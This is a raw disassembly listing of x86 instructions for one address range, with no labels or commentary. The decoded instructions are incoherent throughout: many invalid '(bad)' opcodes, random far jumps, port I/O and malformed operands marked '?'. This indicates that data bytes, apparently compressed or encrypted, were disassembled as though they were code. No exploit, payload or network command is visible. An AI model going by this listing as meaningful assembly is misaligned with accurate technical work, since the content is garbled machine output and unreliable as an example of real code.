  417e39:	(bad)  
  417e3a:	(bad)  
  417e3b:	(bad)  
  417e3d:	xlat   BYTE PTR ds:[ebx]
  417e3e:	aam    0xef
  417e40:	pop    ecx
  417e41:	jecxz  0x417e2e
  417e43:	in     al,dx
  417e44:	dec    esp
  417e45:	add    al,0x1
  417e47:	add    dh,dh
  417e49:	add    BYTE PTR [eax],al
  417e4b:	add    ah,dh
  417e4d:	mov    ds:0xcabf30dd,eax
  417e52:	jle    0x417e81
  417e54:	xlat   BYTE PTR ds:[ebx]
  417e55:	xchg   cx,ax
  417e57:	lock jno 0x417ebe
  417e5a:	sbb    BYTE PTR [ebp-0x1],dl
  417e5d:	sbb    ah,BYTE PTR [ebx]
  417e5f:	xor    BYTE PTR [ecx+0x55],bl
  417e62:	add    DWORD PTR [ecx+0x5a0be48c],edx
  417e68:	mov    ds:0x819d9961,al
  417e6d:	push   0xffffffba
  417e6f:	and    BYTE PTR [ebx+0x1],dl
  417e72:	aam    0x2a
  417e74:	test   eax,0xb6891ebc
  417e79:	cmp    BYTE PTR [esi-0x19466f0a],al
  417e7f:	mov    ds:0xdfc5f640,eax
  417e84:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417e85:	sbb    eax,0xd1c7baf1
  417e8a:	shr    DWORD PTR [ebx+0x30],1
  417e8d:	mov    ch,0xbd
  417e8f:	sub    eax,0x964607da
  417e94:	ret    0xd9d2
  417e97:	push   cs
  417e98:	stc    
  417e99:	mov    BYTE PTR [ebx-0x49971ccc],cl
  417e9f:	mov    al,0x8d
  417ea1:	out    0xc5,al
  417ea3:	aad    0xcc
  417ea5:	xchg   edi,eax
  417ea6:	out    0xc1,eax
  417ea8:	inc    esi
  417ea9:	stos   BYTE PTR es:[edi],al
  417eaa:	adc    eax,0xaf6b5997
  417eaf:	ret    
  417eb0:	sub    al,0x12
  417eb2:	xor    DWORD PTR [ebx],ecx
  417eb4:	or     ah,BYTE PTR [esi-0x6e13448c]
  417eba:	test   al,0x89
  417ebc:	shl    DWORD PTR ds:0xb0d78bcd,0x92
  417ec3:	scas   eax,DWORD PTR es:[edi]
  417ec4:	ds jp  0x417f00
  417ec7:	push   ebp
  417ec8:	ins    BYTE PTR es:[edi],dx
  417ec9:	dec    esp
  417eca:	call   0xa6c1aadf
  417ecf:	aam    0xc7
  417ed1:	adc    eax,DWORD PTR ds:0x32b32b34
  417ed7:	adc    eax,0x8ff02732
  417edc:	xor    cl,BYTE PTR [ecx]
  417ede:	aas    
  417edf:	cmp    DWORD PTR [ecx+0x2d],eax
  417ee2:	cwde   
  417ee3:	mov    DWORD PTR [eax+0x2cec90f9],edi
  417ee9:	shr    BYTE PTR ds:0xdf4b8a40,0xa4
  417ef0:	jecxz  0x417ecd
  417ef2:	rol    dl,cl
  417ef4:	add    eax,DWORD PTR [ebx-0x31f83127]
  417efa:	shl    DWORD PTR [eax],1
  417efc:	lea    eax,[eax+esi*4]
  417eff:	into   
  417f00:	mov    cl,0x6a
  417f02:	inc    eax
  417f03:	scas   al,BYTE PTR es:[edi]
  417f04:	push   0x33
  417f06:	xchg   DWORD PTR [edi-0x2d36d005],esi
  417f0c:	adc    ah,BYTE PTR [esi+0x1bc237eb]
  417f12:	fnstenv ds:0xf3ff4396
  417f18:	outs   dx,BYTE PTR ds:[esi]
  417f19:	and    al,0xee
  417f1b:	fadd   DWORD PTR [eax-0x8]
  417f1e:	mov    ?,WORD PTR [eax+0x16ef3d1]
  417f24:	pop    ss
  417f25:	mov    al,0xa6
  417f27:	push   ds
  417f28:	push   eax
  417f29:	pop    edx
  417f2b:	and    esp,edx
  417f2d:	or     DWORD PTR ds:0xae5d79e5,edi
  417f33:	mov    ebp,0x72378c36
  417f38:	push   ebp
  417f39:	mov    al,BYTE PTR [eax+eiz*8-0x1cd9418b]
  417f40:	sbb    cl,bh
	...
  417fb2:	add    BYTE PTR [eax],al
  417fb4:	jbe    0x417fe3
  417fb6:	push   ebp
  417fb7:	inc    ecx
  417fb8:	pop    edi
  417fb9:	jns    0x418031
  417fbb:	aas    
  417fbc:	fisttp DWORD PTR [esi-0x68]
  417fbf:	inc    edx
  417fc0:	ss sti 
  417fc2:	adc    ah,BYTE PTR [edx+eax*2-0x9fffefb]
  417fc9:	add    BYTE PTR [eax],al
  417fcb:	add    BYTE PTR [edi+ebp*8+0x2c09c77c],bl
  417fd2:	lods   eax,DWORD PTR ds:[esi]
  417fd3:	pop    esi
  417fd4:	sub    ecx,DWORD PTR [edi-0x41a57ed6]
  417fda:	lea    esp,[ebx-0x248c64af]
  417fe0:	cmp    edi,DWORD PTR [esi+ebp*2]
  417fe3:	sub    ecx,ecx
  417fe5:	jo     0x417f70
  417fe7:	fcom   QWORD PTR [esp+esi*2]
  417fea:	(bad)  
  417feb:	adc    ebp,esp
  417fed:	jp     0x417f87
  417fef:	cmp    al,0x0
  417ff1:	xchg   edi,eax
  417ff2:	out    dx,eax
  417ff3:	fdivr  QWORD PTR fs:[edx-0x35]
  417ff7:	loopne 0x417ff7
  417ff9:	xchg   ecx,eax
  417ffa:	mov    edx,0x7b3749b6
  417fff:	cmc    
  418000:	fisub  DWORD PTR [eax-0x11b578a7]
  418006:	inc    ebp
  418007:	loop   0x417fa5
  418009:	dec    ebx
  41800a:	fsub   st,st(7)
  41800c:	push   0xb
  41800e:	mov    al,ds:0xe48ab99e
  418013:	aaa    
  418014:	iret   
  418015:	sub    eax,0x855a8b90
  41801a:	cmp    DWORD PTR [ebx-0x7eab22f6],esi
  418020:	cmp    eax,0x4bc60203
  418025:	jns    0x418075
  418027:	xchg   ecx,eax
  418028:	iret   
  418029:	xlat   BYTE PTR ds:[ebx]
  41802a:	adc    al,BYTE PTR [eax+ebp*2+0x5d]
  41802e:	mov    ebx,?
  418030:	mov    ds:0xfe43a730,al
  418035:	inc    eax
  418036:	mov    ebx,0xc422f899
  41803b:	push   ebp
  41803c:	loop   0x417fe0
  41803e:	dec    eax
  41803f:	es jg  0x4180c0
  418042:	or     edx,edi
  418044:	pop    ss
  418045:	push   edi
  418046:	mov    ss,WORD PTR [ebx+ebx*4]
  418049:	sub    ebx,esp
  41804b:	(bad)  
  41804c:	stos   DWORD PTR es:[edi],eax
  41804d:	sub    eax,0xc44c67d2
  418052:	dec    ebx
  418053:	lock push cs
  418055:	pushf  
  418056:	or     al,0x14
  418058:	dec    esp
  418059:	dec    ecx
  41805a:	sar    BYTE PTR [edx-0x7b],0x59
  41805e:	lahf   
  41805f:	pop    ebx
  418060:	enter  0xe91a,0x57
  418064:	test   DWORD PTR [ebx+0x166a1f63],ebx
  41806a:	fidivr WORD PTR [esi-0x66806cf]
  418070:	mov    bl,0x8c
  418072:	mov    edx,0x1c1e6d0
  418077:	inc    ecx
  418078:	hlt    
  418079:	test   eax,0xaac38b10
  41807e:	(bad)  
  41807f:	sub    eax,DWORD PTR [eax+0x73675f71]
  418085:	in     eax,dx
  418086:	mov    BYTE PTR [eax-0x24],dl
  418089:	and    al,0xe8
  41808b:	leave  
  41808c:	sbb    BYTE PTR [edx-0x71],cl
  41808f:	popa   
  418090:	mov    ecx,0x70a0c689
  418095:	jbe    0x418018
  418097:	popa   
  418098:	jb     0x41806d
  41809a:	gs addr16 jmp 0xe2a8:0x4998a551
  4180a3:	cld    
  4180a4:	ins    DWORD PTR es:[edi],dx
  4180a5:	pusha  
  4180a6:	push   esp
  4180a7:	xor    edx,DWORD PTR [edi-0x7e450e19]
  4180ad:	cmp    al,0x69
  4180af:	int    0x33
  4180b1:	in     eax,0x50
  4180b3:	mov    dh,0x42
  4180b5:	pop    esp
  4180b6:	mov    dh,0x6d
  4180b8:	mov    edx,0xc980af34
  4180bd:	clc    
  4180be:	mov    esp,DWORD PTR [ebx]
  4180c0:	ja     0x4180a7
	...
  418132:	add    BYTE PTR [eax],al
  418134:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418135:	sbb    DWORD PTR [eax+0x1a],esi
  418138:	(bad)  
  418139:	jnp    0x418129
  41813b:	mov    ebp,0xe8ea9e45
  418140:	dec    edx
  418141:	in     eax,dx
  418142:	(bad)
  418145:	push   es
  418146:	add    DWORD PTR [eax],eax
  418148:	test   BYTE PTR [eax],0x0
  41814b:	add    BYTE PTR [edx],ch
  41814d:	sub    ecx,ecx
  41814f:	into   
  418150:	nop
  418151:	xchg   DWORD PTR [ebx-0x6c1c81c5],ecx
  418157:	dec    ebp
  418158:	repz out dx,al
  41815a:	cwde   
  41815b:	push   edi
  41815c:	(bad)  
  41815d:	mov    esp,esp
  41815f:	jbe    0x418193
  418161:	mov    dl,0xf5
  418163:	iret   
  418164:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418165:	pop    edx
  418166:	out    0x11,eax
  418168:	scas   al,BYTE PTR es:[edi]
  418169:	inc    ebx
  41816a:	imul   esi,DWORD PTR [edx-0x714fe903],0xef6524a2
  418174:	cmp    BYTE PTR [ebx-0x3c],ah
  418177:	xlat   BYTE PTR ds:[ebx]
  418178:	stos   DWORD PTR es:[edi],eax
  418179:	mov    ds:0xea6c72ef,eax
  41817e:	inc    edi
  41817f:	dec    eax
  418180:	popa   
  418181:	sti    
  418182:	fwait
  418183:	dec    ebx
  418184:	xchg   edx,eax
  418185:	push   ebp
  418186:	repnz mov al,0x64
  418189:	pusha  
  41818a:	and    edi,DWORD PTR [edi+edx*2+0x4b]
  41818e:	enter  0x724a,0x95
  418192:	retf   
  418193:	sbb    al,0xd7
  418195:	fs jns 0x41813f
  418198:	mov    dh,0x63
  41819a:	inc    ecx
  41819b:	push   cs
  41819c:	std    
  41819d:	push   ds
  41819e:	stos   BYTE PTR es:[edi],al
  41819f:	mov    ch,0x44
  4181a1:	sti    
  4181a2:	xor    al,0x64
  4181a4:	push   ds
  4181a5:	rcr    bh,1
  4181a7:	pop    ebp
  4181a8:	ins    DWORD PTR es:[edi],dx
  4181a9:	ror    DWORD PTR [eax],cl
  4181ab:	jp     0x4181f8
  4181ad:	(bad)  
  4181ae:	enter  0xf9a3,0x14
  4181b2:	lock pushf 
  4181b4:	xchg   ebp,eax
  4181b5:	repz and BYTE PTR [eax],bh
  4181b8:	je     0x41822d
  4181ba:	stc    
  4181bb:	js     0x418184
  4181bd:	cmp    dh,dl
  4181bf:	(bad)  
  4181c1:	(bad)  
  4181c2:	imul   eax,DWORD PTR [ebx-0x6fc4417b],0x40
  4181c9:	clc    
  4181ca:	mov    al,ds:0xdfe2bc02
  4181cf:	out    0xdb,eax
  4181d1:	or     eax,0x6ee11c6d
  4181d6:	fmul   QWORD PTR [ebx+0x65]
  4181d9:	or     BYTE PTR [edi],dl
  4181db:	add    DWORD PTR [eax-0x16],ebx
  4181de:	idiv   BYTE PTR [edx-0x75]
  4181e1:	test   eax,0x89318a7
  4181e6:	adc    dl,al
  4181e8:	in     eax,dx
  4181e9:	sbb    eax,0x4f384c45
  4181ee:	mov    dh,0x9b
  4181f0:	add    al,BYTE PTR [ecx-0x3e]
  4181f3:	retf   
  4181f4:	cwde   
  4181f5:	mov    al,0x87
  4181f7:	dec    esp
  4181f8:	mov    edi,0x707f2a7d
  4181fd:	pushf  
  4181fe:	stc    
  4181ff:	inc    esi
  418200:	daa    
  418201:	inc    ebp
  418202:	inc    ebx
  418203:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418204:	pop    eax
  418205:	popa   
  418206:	(bad)  
  418207:	dec    eax
  418208:	jb     0x41819d
  41820a:	mov    dl,0xad
  41820c:	mov    cl,0xaa
  41820e:	sbb    al,0x54
  418210:	nop
  418211:	inc    ecx
  418212:	or     al,0xc8
  418214:	jle    0x418255
  418216:	push   ss
  418217:	or     BYTE PTR [ebp+0x13],0x43
  41821b:	ins    BYTE PTR es:[edi],dx
  41821c:	dec    ecx
  41821d:	xlat   BYTE PTR ds:[ebx]
  41821e:	repnz (bad) 
  418220:	mov    esp,0xd1b85588
  418225:	jl     0x418214
  418227:	push   ss
  418228:	nop
  418229:	scas   eax,DWORD PTR es:[edi]
  41822a:	retf   0x594c
  41822d:	gs mov esp,0x6ad7c7aa
  418233:	sbb    ebp,DWORD PTR [esp+ecx*4]
  418236:	inc    esi
  418237:	rcr    BYTE PTR [ecx+0x13],1
  41823a:	into   
  41823b:	add    al,0x6a
  41823d:	adc    DWORD PTR [eax+0x3c],eax
  418240:	jb     0x418251
	...
  4182b2:	add    BYTE PTR [eax],al
  4182b4:	imul   edi,DWORD PTR [edi+edx*8-0x168028a2],0x3ef3ecbf
  4182bf:	adc    DWORD PTR [ecx+0x2e14ad6f],ecx
  4182c5:	pop    es
  4182c6:	add    DWORD PTR [eax],eax
  4182c8:	test   BYTE PTR [eax],0x0
  4182cb:	add    BYTE PTR [edx+ecx*4],cl
  4182ce:	sbb    eax,0x9268c782
  4182d3:	xor    BYTE PTR [ebp+0x71],0x43
  4182d7:	sub    BYTE PTR ds:0x591f1763,ch
  4182dd:	add    al,0xd9
  4182df:	out    dx,eax
  4182e0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4182e1:	jmp    0x432d:0xc5e411fb
  4182e8:	mov    WORD PTR [ebx],gs
  4182ea:	pop    ebx
  4182eb:	scas   al,BYTE PTR es:[edi]
  4182ec:	mov    ebx,0xa5ccfe0e
  4182f1:	dec    edi
  4182f2:	daa    
  4182f3:	cmp    eax,0xc43d58cd
  4182f8:	pop    ds
  4182f9:	xchg   edx,eax
  4182fa:	add    eax,0xfbe6ac23
  4182ff:	xchg   ch,cl
  418301:	es inc esp
  418303:	dec    ebp
  418304:	pop    ss
  418305:	lods   al,BYTE PTR ds:[esi]
  418306:	xchg   esp,eax
  418307:	sbb    eax,0x444c9ac9
  41830c:	jmp    0x41833e
  41830e:	inc    edx
  41830f:	inc    ebx
  418310:	fnclex 
  418312:	stc    
  418313:	mov    ebp,0x6cf9b218
  418318:	jne    0x4182bf
  41831a:	aad    0xd
  41831c:	retf   0xf495
  41831f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418320:	mov    dh,BYTE PTR ds:0xcb77f6df
  418326:	mov    ebp,0xf8df2439
  41832b:	sub    BYTE PTR [esi+esi*1+0x67],0xb1
  418330:	push   0x7ae32e63
  418335:	jle    0x418348
  418337:	inc    esi
  418338:	iret   
  418339:	sub    al,0xf8
  41833b:	sub    DWORD PTR [esi-0x6ecc6c19],0x122706a6
  418345:	lahf   
  418346:	(bad)  
  418347:	enter  0x3b71,0xa4
  41834b:	ja     0x418328
  41834d:	es xor eax,0x12933e3a
  418353:	mov    ebx,0x104c742d
  418358:	sub    eax,0xc082107a
  41835d:	xchg   esp,eax
  41835e:	xor    esi,DWORD PTR [edx+0x67]
  418361:	dec    edi
  418362:	sub    esp,ebp
  418364:	push   DWORD PTR [edi]
  418366:	jb     0x4183ae
  418368:	sbb    al,0x1d
  41836a:	lds    esi,FWORD PTR [eax]
  41836c:	push   eax
  41836d:	pushf  
  41836e:	ror    edx,1
  418370:	sbb    eax,0xcb7f3f32
  418375:	int    0x68
  418377:	adc    cl,BYTE PTR [ebx+0x5]
  41837a:	ror    DWORD PTR [esi],cl
  41837c:	mov    cs,WORD PTR [ebp-0x15326eab]
  418382:	push   ebx
  418383:	fidivr DWORD PTR ds:0xcf0b5075
  418389:	or     DWORD PTR [esi],esp
  41838b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41838c:	push   edx
  41838d:	xor    ch,BYTE PTR [eax+0x5f7b3bf7]
  418393:	and    cl,BYTE PTR [ebx+esi*2-0x2b0a5ed1]
  41839a:	(bad)  
  41839c:	dec    ebp
  41839d:	(bad)  
  41839e:	mov    ds:0x581fa370,al
  4183a3:	jb     0x41835c
  4183a5:	push   edx
  4183a6:	(bad)  
  4183a7:	fdiv   DWORD PTR [esi-0x2c7c0250]
  4183ad:	(bad)  
  4183ae:	test   al,0x93
  4183b0:	pop    ds
  4183b1:	nop
  4183b2:	push   0x4754ea26
  4183b7:	push   es
  4183b8:	ins    BYTE PTR es:[edi],dx
  4183b9:	int    0x51
  4183bb:	add    al,0x2e
  4183be:	lds    ecx,FWORD PTR [ebx+0x4f0]
	...
  418434:	xchg   ecx,eax
  418435:	mov    edx,0xdc6b0c6a
  41843a:	idiv   DWORD PTR [edi-0x233270d3]
  418440:	mov    ecx,0x824efb9
  418446:	add    DWORD PTR [eax],eax
  418448:	test   BYTE PTR [eax],0x0
  41844b:	add    BYTE PTR [edx+0x37],bl
  41844e:	enter  0xd1d3,0x6d
  418452:	push   ebx
  418453:	mov    al,ds:0xed5ed5fe
  418458:	out    dx,eax
  418459:	sub    ecx,edi
  41845b:	mov    ah,0xf
  41845d:	mov    ecx,0xd4810eae
  418462:	sbb    bh,BYTE PTR [edx]
  418464:	jae    0x4183ef
  418466:	xchg   BYTE PTR [ecx+0x347a9f8d],dl
  41846c:	mov    esi,0x777a2200
  418471:	scas   eax,DWORD PTR es:[edi]
  418472:	sbb    cl,cl
  418474:	cli    
  418475:	hlt    
  418476:	push   es
  418477:	(bad)  
  418478:	aad    0xea
  41847a:	pusha  
  41847b:	dec    edx
  41847c:	int3   
  41847d:	cmp    ah,BYTE PTR [ecx-0x55523edc]
  418483:	xchg   edx,eax
  418484:	adc    bh,0x73
  418487:	sub    eax,0x5b547452
  41848c:	pop    es
  41848d:	adc    dh,ch
  41848f:	call   0x45d47724
  418494:	jp     0x418443
  418496:	sbb    al,0xb8
  418498:	ret    0xa19
  41849b:	sub    ebx,DWORD PTR [edi]
  41849d:	mov    edi,0x355f04ba
  4184a2:	(bad)  
  4184a3:	jmp    0xe525f608
  4184a8:	mov    bl,0xb1
  4184aa:	pop    eax
  4184ab:	popf   
  4184ac:	stos   BYTE PTR es:[edi],al
  4184ad:	test   DWORD PTR [edx-0x1],esp
  4184b0:	sbb    DWORD PTR [esi],ebx
  4184b2:	mov    cl,0x62
  4184b4:	mov    ebx,?
  4184b6:	hlt    
  4184b7:	mov    ds:0x7c4f5d64,eax
  4184bc:	pop    es
  4184bd:	xchg   DWORD PTR [edx+eax*1+0x36],esp
  4184c1:	push   ebp
  4184c2:	call   0x57f0:0xb1394549
  4184c9:	fbld   TBYTE PTR [ebx]
  4184cb:	mov    ah,0xc3
  4184cd:	add    ch,BYTE PTR [eax-0x5f]
  4184d0:	fs sbb eax,0x5e944a47
  4184d6:	pop    es
  4184d7:	adc    ecx,DWORD PTR [edi+0x78]
  4184da:	in     eax,0x77
  4184dc:	mov    edi,0x3d6d7c80
  4184e1:	adc    esi,DWORD PTR [edx]
  4184e3:	imul   esi,ebp,0x5ae1de83
  4184e9:	mov    ds:0xf6dda42,al
  4184ee:	and    DWORD PTR [esi+0x14],ebp
  4184f1:	jle    0x4184d5
  4184f3:	sub    eax,DWORD PTR [ebp+edi*8+0x40644038]
  4184fa:	fbld   TBYTE PTR [esi-0x21]
  4184fd:	jmp    0x4184ff
  4184ff:	ret    0x6bfb
  418502:	pop    ds
  418503:	add    bl,BYTE PTR [ecx-0x4e8c73c2]
  418509:	jge    0x418548
  41850b:	and    eax,0x8c89923b
  418510:	fiadd  DWORD PTR [ebx]
  418512:	call   0x5ecd83a0
  418517:	shl    DWORD PTR [edx],cl
  418519:	xor    BYTE PTR [ecx+0x36393dfe],ch
  41851f:	sbb    al,0xa9
  418521:	adc    DWORD PTR [ecx+ebp*1],ebp
  418524:	fldcw  WORD PTR [edi+0x1d]
  418527:	mov    ebx,0x6a0d9cd3
  41852c:	test   eax,0x5ffbc8bf
  418531:	pop    esi
  418532:	leave  
  418533:	js     0x4185b3
  418535:	mov    WORD PTR [esp+eax*4],es
  418538:	push   edx
  418539:	(bad)  
  41853a:	out    dx,al
  41853b:	inc    esp
  41853c:	mov    dl,0x82
  41853e:	out    dx,eax
  41853f:	xchg   edx,eax
  418540:	lea    eax,[eax+eax*1]
	...
  4185b3:	add    BYTE PTR [ecx-0x20b02c99],ch
  4185b9:	(bad)  
  4185ba:	mov    ebp,0x15c03be7
  4185bf:	stc    
  4185c0:	ret    
  4185c1:	xchg   DWORD PTR [esi],ebp
  4185c3:	stc    
  4185c4:	sbb    cl,BYTE PTR [ecx]
  4185c6:	add    DWORD PTR [eax],eax
  4185c8:	test   BYTE PTR [eax],0x0
  4185cb:	add    BYTE PTR [eax],cl
  4185cd:	dec    ebp
  4185ce:	sub    al,bl
  4185d0:	xlat   BYTE PTR ds:[ebx]
  4185d1:	jmp    0x4185b1
  4185d3:	xchg   edx,eax
  4185d4:	or     BYTE PTR [edx+0x4027c923],ch
  4185da:	fisttp DWORD PTR [edx-0x4a]
  4185dd:	cs and edx,esi
  4185e0:	out    0xbd,eax
  4185e2:	mov    eax,0x69f60c1c
  4185e7:	push   esp
  4185e8:	adc    ecx,edi
  4185ea:	dec    eax
  4185eb:	cli    
  4185ec:	dec    esp
  4185ed:	(bad)  [ebp-0x3c4ca659]
  4185f3:	and    BYTE PTR [ebx-0x2a],bl
  4185f6:	ja     0x4185ca
  4185f8:	jecxz  0x4185c2
  4185fa:	jp     0x418608
  4185fc:	(bad)  
  4185fd:	je     0x418592
  4185ff:	lods   al,BYTE PTR ds:[esi]
  418600:	ins    BYTE PTR es:[edi],dx
  418601:	in     eax,dx
  418602:	ret    
  418603:	call   0xcd93adee
  418608:	sub    bh,BYTE PTR [ecx-0x5f4fb80a]
  41860e:	scas   al,BYTE PTR es:[edi]
  41860f:	popa   
  418610:	xor    al,0x7e
  418612:	in     al,dx
  418613:	sub    DWORD PTR [ebp+0x35a1a177],ecx
  418619:	shl    BYTE PTR [eax+0x57c14577],0x1e
  418620:	jmp    FWORD PTR [edi]
  418622:	push   ds
  418623:	out    dx,eax
  418624:	retf   
  418625:	mov    esp,0x6bb210d5
  41862a:	or     al,0x89
  41862c:	inc    eax
  41862d:	test   BYTE PTR [eax-0x35],bh
  418630:	cmc    
  418631:	mov    cs,esp
  418633:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418634:	jnp    0x418624
  418636:	loope  0x4185fd
  418638:	cdq    
  418639:	es dec esi
  41863b:	cli    
  41863c:	or     edx,DWORD PTR [esi+0x5c9048d5]
  418642:	and    edi,ebp
  418644:	sbb    BYTE PTR [ebp+eiz*1-0x33],ah
  418648:	out    dx,al
  418649:	xchg   esi,eax
  41864a:	push   edi
  41864b:	jge    0x418684
  41864d:	mov    bh,0xb4
  41864f:	jne    0x418639
  418651:	aas    
  418652:	and    edi,DWORD PTR [esi]
  418654:	int3   
  418655:	jle    0x4186a4
  418657:	ror    BYTE PTR [edi+ebx*1],0x5f
  41865b:	ror    ebp,cl
  41865d:	jb     0x41868d
  41865f:	xlat   BYTE PTR ds:[ebx]
  418660:	(bad)  
  418661:	jne    0x41866e
  418663:	imul   eax
  418665:	std    
  418666:	inc    esi
  418667:	fwait
  418668:	lods   eax,DWORD PTR ds:[esi]
  418669:	into   
  41866a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41866b:	pop    edi
  41866c:	inc    esi
  41866d:	loop   0x418695
  41866f:	add    al,0xc0
  418671:	pop    ecx
  418672:	dec    esi
  418673:	daa    
  418674:	pop    esi
  418675:	dec    eax
  418676:	inc    ebp
  418677:	push   edx
  418678:	leave  
  418679:	lods   al,BYTE PTR ds:[esi]
  41867a:	jns    0x418607
  41867c:	jmp    0x41869f
  41867e:	jb     0x4186bd
  418680:	mov    BYTE PTR [edx+edi*2-0x79],ah
  418684:	aam    0x3c
  418686:	inc    ebx
  418687:	leave  
  418688:	inc    esp
  418689:	jp     0x418679
  41868b:	in     eax,dx
  41868c:	sbb    BYTE PTR [ecx],dl
  41868e:	push   ss
  41868f:	mov    al,0x5d
  418691:	mov    BYTE PTR [edi+0x145c85a],cl
  418697:	sbb    BYTE PTR [edi+0x21],dl
  41869a:	jne    0x418696
  41869c:	in     al,dx
  41869d:	pop    ecx
  41869e:	xchg   esp,eax
  41869f:	xchg   esp,eax
  4186a0:	push   esi
  4186a1:	inc    ecx
  4186a2:	inc    edi
  4186a3:	xor    BYTE PTR [eax+0x25d88671],0xc7
  4186aa:	jns    0x418708
  4186ac:	hlt    
  4186ad:	rol    DWORD PTR [ecx+eax*8-0x33],0x71
  4186b2:	int3   
  4186b3:	retf   0xe9ed
  4186b6:	lds    eax,FWORD PTR [esi+ecx*2]
  4186b9:	add    BYTE PTR [edx*1+0x57e91127],0xeb
  4186c1:	js     0x4186c3
	...
  418733:	add    cl,ch
  418735:	push   cs
  418736:	(bad)  
  418737:	pop    ss
  418738:	push   edi
  41873a:	jmp    0xecc1a73d
  41873f:	sub    esp,DWORD PTR [edi]
  418741:	arpl   WORD PTR [bx],ax
  418744:	adc    BYTE PTR [edx],cl
  418746:	add    DWORD PTR [eax],eax
  418748:	test   BYTE PTR [eax],0x0
  41874b:	add    BYTE PTR [ebp-0x5f],cl
  41874e:	and    al,cl
  418750:	faddp  st(5),st
  418752:	shl    DWORD PTR [eax-0x6303397a],1
  418758:	xchg   esp,eax
  418759:	push   edx
  41875a:	mov    cl,0x1
  41875c:	mov    esp,0x4a55e7d
  418761:	and    BYTE PTR [ecx-0x7c952fa9],dh
  418767:	sub    ebx,ebp
  418769:	or     DWORD PTR [ecx-0x4e9609c8],ebx
  41876f:	addr16 cmp eax,0x922020e8
  418775:	nop
  418776:	or     eax,0xa8aae8ed
  41877b:	mov    ds:0x1dfdd674,al
  418780:	jno    0x418755
  418782:	xor    edi,ebx
  418784:	mov    al,ds:0x300051cf
  418789:	xlat   BYTE PTR es:[ebx]
  41878b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41878c:	mov    bh,0xb2
  41878e:	jae    0x4187ce
  418790:	push   ecx
  418791:	dec    esp
  418792:	fist   WORD PTR [esi]
  418794:	cmp    eax,0xe559222f
  418799:	aaa    
  41879a:	xor    eax,0x8587ad83
  41879f:	repz mov ecx,DWORD PTR [edi-0x1f]
  4187a3:	mov    edx,0x359b22d2
  4187a8:	nop
  4187a9:	dec    edx
  4187aa:	mov    ebx,0x918a91cc
  4187af:	push   ss
  4187b0:	loop   0x4187e8
  4187b2:	iret   
  4187b3:	outs   dx,BYTE PTR ds:[esi]
  4187b4:	out    0x53,eax
  4187b6:	stos   BYTE PTR es:[edi],al
  4187b7:	div    ch
  4187b9:	iret   
  4187ba:	aam    0xa8
  4187bc:	gs inc ebx
  4187be:	mov    ebp,0xbfa76b74
  4187c3:	fs int3 
  4187c5:	pop    edi
  4187c6:	pop    edx
  4187c7:	les    edx,FWORD PTR [ecx+0x49fc65f0]
  4187cd:	daa    
  4187ce:	jns    0x418830
  4187d0:	or     esp,DWORD PTR [ebx]
  4187d2:	dec    eax
  4187d3:	shr    DWORD PTR [edx+eiz*4-0x6],0xaa
  4187d8:	out    dx,eax
  4187d9:	(bad)  
  4187da:	dec    esi
  4187db:	out    0xe0,eax
  4187dd:	pushf  
  4187de:	push   0xa531cb26
  4187e3:	pop    ds
  4187e4:	mov    ch,0x40
  4187e6:	mov    cl,0x4f
  4187e8:	jae    0x4187d1
  4187ea:	mov    ebx,0xa9194280
  4187ef:	daa    
  4187f0:	cli    
  4187f1:	cmp    eax,ecx
  4187f3:	mov    dl,BYTE PTR [edx]
  4187f5:	xchg   edx,eax
  4187f6:	arpl   WORD PTR [ebx+0x6],sp
  4187f9:	push   es
  4187fa:	pop    ss
  4187fb:	inc    eax
  4187fc:	call   0xcb151611
  418801:	xor    bh,ch
  418803:	lods   al,BYTE PTR ds:[esi]
  418804:	aaa    
  418805:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418806:	add    dl,al
  418808:	sbb    al,0x28
  41880a:	retf   
  41880b:	or     dl,BYTE PTR [esi-0x60]
  41880e:	push   ds
  41880f:	mov    cl,0xe1
  418811:	test   al,0x3c
  418813:	mov    edi,0x6d143628
  418818:	repz out dx,eax
  41881a:	pop    ebp
  41881b:	sub    eax,0xdcb75211
  418820:	xor    al,0xd5
  418822:	mov    ecx,0x287b7d70
  418827:	pop    es
  418828:	lds    ebp,FWORD PTR ss:[eax-0x72]
  41882c:	mov    ah,0x3d
  41882e:	jge    0x4187fd
  418830:	stc    
  418831:	push   es
  418832:	ins    BYTE PTR es:[edi],dx
  418833:	and    al,0xee
  418835:	pop    ecx
  418836:	mov    ds:0x6197bc8f,eax
  41883b:	(bad)  
  41883c:	in     eax,dx
  41883d:	enter  0x82dc,0xc2
  418841:	mov    ebx,0x0
	...
  4188b2:	add    BYTE PTR [eax],al
  4188b4:	pop    eax
  4188b5:	inc    ecx
  4188b6:	pop    ds
  4188b7:	lods   eax,DWORD PTR ds:[esi]
  4188b8:	pop    ds
  4188b9:	(bad)  
  4188ba:	cli    
  4188bb:	cmc    
  4188bc:	inc    ebx
  4188bd:	mov    ss:0xc7754132,al
  4188c3:	int    0x6
  4188c5:	or     eax,DWORD PTR [ecx]
  4188c7:	add    dh,dh
  4188c9:	add    BYTE PTR [eax],al
  4188cb:	add    BYTE PTR [ecx-0x3aee41da],bl
  4188d1:	pop    eax
  4188d2:	inc    esi
  4188d3:	xchg   ebp,eax
  4188d4:	int    0x1a
  4188d6:	loope  0x41890d
  4188d8:	mov    ?,ebx
  4188da:	daa    
  4188db:	aad    0xd
  4188dd:	mov    esi,0xf3a6c590
  4188e2:	cs sbb eax,0xd8567301
  4188e8:	stos   BYTE PTR es:[edi],al
  4188e9:	ret    
  4188ea:	out    0xb3,eax
  4188ec:	outs   dx,BYTE PTR ds:[esi]
  4188ed:	call   0x95667ee1
  4188f2:	out    0x9e,al
  4188f4:	inc    esp
  4188f5:	pop    edi
  4188f6:	je     0x41894e
  4188f8:	fcomi  st,st(3)
  4188fa:	lods   al,BYTE PTR ds:[esi]
  4188fb:	sub    bh,BYTE PTR [esi-0x344a19c4]
  418901:	in     eax,0x10
